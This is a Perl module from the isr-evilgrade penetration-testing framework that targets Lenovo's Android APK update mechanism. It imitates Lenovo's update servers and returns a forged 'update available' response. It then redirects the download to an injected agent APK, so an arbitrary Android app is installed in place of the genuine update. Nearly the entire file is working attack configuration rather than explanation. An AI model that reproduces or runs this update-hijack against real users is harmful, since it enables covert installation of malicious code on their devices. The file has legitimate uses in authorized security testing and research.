###############
# lenovoapk.pm
#
# Copyright 2016 Matias Ariel Re Medina
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::lenovoapk;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'lenovoapk',
    'version'     => '1.0',
    'appver'      => 'All',
    'author'      => ['Matias Ariel Re Medina <mre[at]faradaysec[dot]com>'],
    'description' => qq{Lenovo's APK Update},
    'vh'          => 'suslcs.lenovomm.com|susapi.lenovomm.com',
    'request'     => [
        {   'req'    => '/adpserver/GetVIByPN',    #regex friendly
            'type'   => 'string',                  #file|string|agent|install
            'method' => '',                        #any
            'bin'    => '0',
            'string' => 'SUS-{
                        "SUSRESINFO": {
                            "ChannelKey":"null",
                            ,"VerCode":"<%RND5%>",
                            ,"VerName":"<%RND4%>.<%RND6%>.<%RND7%>",
                            ,"DownloadURL":"http://suslcs.lenovomm.com/*01*L2FkcEBjbHVzdGVyLTEvMTQ1MDY2NjQxMTk1NS9OTVAwNk1HODZYV0MvMjYvbnVsbC9NakhlaWJlaU4yMzZiX3NpZ25lZC5hcGt8LTF8MHww",
                            ,"Size":"<%AGENTSIZE%>",
                            ,"UpdateDesc":"1%E3%80%81%E4%BF%AE%E6%AD%A3%E9%83%A8%E5%88%86%E7%A8%8B%E5%BA%8F%E9%97%AE%E9%A2%98%0A2%E3%80%81%E4%BC%98%E5%8C%96%E7%B3%BB%E7%BB%9F%E8%B5%84%E6%BA%90%E4%BD%BF%E7%94%A8",
                            ,"FileName":"<%APKNAME%>.apk",
                            ,"CtrlKey":"0",
                            ,"RRules":"NO_RULES",
                            ,"CustKey":"null",
                            ,"PackageID":"<%RND3%>",
                            ,"RegionKey":"SEA",
                            ,"RES":"SUCCESS",
                            ,"FORMATTYPE":"FTYPE_1"
                            }
                        }',
            'parse' => '1',
            'file'  => '',
        },
        {   'req'     => '\*\d+\*\w+',              #regex friendly
            'type'    => 'agent',                   #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => 1,
            'string'  => '',
            'parse'   => '1',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://suslcs.lenovomm.com/<%APKNAME%>.apk \r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },
        {   'req'    => '.apk',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/agent_stub.apk',
            'desc' => 'Agent to inject, must be an android app.'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'apkname' => {
            'val'  => 'LenovoApp_signed',
            'desc' => 'App name.'
        },
        'rnd3' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd4' => {
            'val'     => 'isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd5' => {
            'val'     => 'isrcore::utils::RndNum(2)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd6' => {
            'val'     => 'isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd7' => {
            'val'     => 'isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
